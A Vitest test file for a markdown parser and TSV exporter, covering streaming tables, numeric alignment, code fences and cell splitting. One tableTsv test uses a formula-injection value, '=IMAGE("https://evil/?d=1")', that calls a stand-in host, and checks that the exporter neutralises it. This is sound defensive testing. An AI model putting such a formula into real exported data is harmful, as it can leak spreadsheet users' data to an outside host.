import { describe, expect, it } from 'vitest';
import { mdBlocks, tableTsv } from '../markdown-parse';

const TABLE =
  'Sales:\n| 项目 | 金额 |\n|---|---|\n| Silver | RM 12 |\n| Gold | RM 3';

describe('streaming tables', () => {
  it('hides a header until its |---| row arrives', () => {
    for (const text of [
      'Sales:\n| 项目 | 金额',
      'Sales:\n| 项目 | 金额 |\n',
      'Sales:\n| 项目 | 金额 |\n|--',
    ]) {
      expect(mdBlocks(text, true)).toEqual([{ kind: 'p', lines: ['Sales:'] }]);
    }
  });

  it('shows a head-only table once the separator is whole', () => {
    expect(mdBlocks('| a | b |\n|---|---|\n', true)).toEqual([
      { kind: 'table', head: ['a', 'b'], align: [null, null], rows: [] },
    ]);
  });

  it('holds back a row until its newline, but only while streaming', () => {
    expect(mdBlocks(TABLE, true)[1]).toMatchObject({
      rows: [['Silver', 'RM 12']],
    });
    expect(mdBlocks(TABLE)[1]).toMatchObject({
      rows: [
        ['Silver', 'RM 12'],
        ['Gold', 'RM 3'],
      ],
    });
  });

  it('keeps a "|" line inside an open code fence', () => {
    expect(mdBlocks('```\n| x', true)).toEqual([{ kind: 'code', text: '| x' }]);
  });
});

describe('numeric columns', () => {
  const align = (column: string[], sep = '---') =>
    (
      mdBlocks(
        `| v |\n|${sep}|\n${column.map((c) => `| ${c} |`).join('\n')}`,
      )[0] as {
        align: unknown[];
      }
    ).align[0];

  it('right-aligns amounts, counts and percentages', () => {
    expect(
      align(['RM -12.50', '-RM 12', '12.5%', '1,234', '**RM 9**', '—', 'S$30']),
    ).toBe('right');
  });

  it('leaves text and mixed columns alone, and lets a colon win', () => {
    expect(align(['12', 'Gold'])).toBeNull();
    expect(align(['—', '-'])).toBeNull();
    expect(align(['12'], ':---')).toBe('left');
  });
});

describe('code blocks', () => {
  it('keeps the body raw and drops the language tag', () => {
    expect(mdBlocks('```sql\nselect **x** | y\n```\nafter')).toEqual([
      { kind: 'code', text: 'select **x** | y' },
      { kind: 'p', lines: ['after'] },
    ]);
  });
});

describe('table cells', () => {
  it('splits on bare pipes only: \\| and `a|b` stay in their cell', () => {
    expect(
      mdBlocks('| op | how |\n|---|---|\n| a \\| b | `x|y` and `p\\|q` |')[0],
    ).toMatchObject({
      head: ['op', 'how'],
      rows: [['a | b', '`x|y` and `p|q`']],
    });
  });

  it('keeps an empty last cell and a lone backtick', () => {
    expect(mdBlocks('| a | b |\n|---|---|\n| it`s | |')[0]).toMatchObject({
      rows: [['it`s', '']],
    });
  });
});

describe('tableTsv', () => {
  it('prefixes formulas but leaves plain numbers alone', () => {
    expect(
      tableTsv([
        [
          '=IMAGE("https://evil/?d=1")',
          '+1',
          '-12.5',
          '@x',
          '-RM 12',
          '**=1**',
        ],
        ['12', '-3%', '1,234', 'Gold', '`code`', 'a=b'],
      ]),
    ).toBe(
      "'=IMAGE(\"https://evil/?d=1\")\t+1\t-12.5\t'@x\t'-RM 12\t'=1\n" +
        '12\t-3%\t1,234\tGold\tcode\ta=b',
    );
  });

  it('puts tabs and line breaks inside a cell on one line', () => {
    expect(tableTsv([['a\tb', 'c\r\nd']])).toBe('a b\tc  d');
  });
});
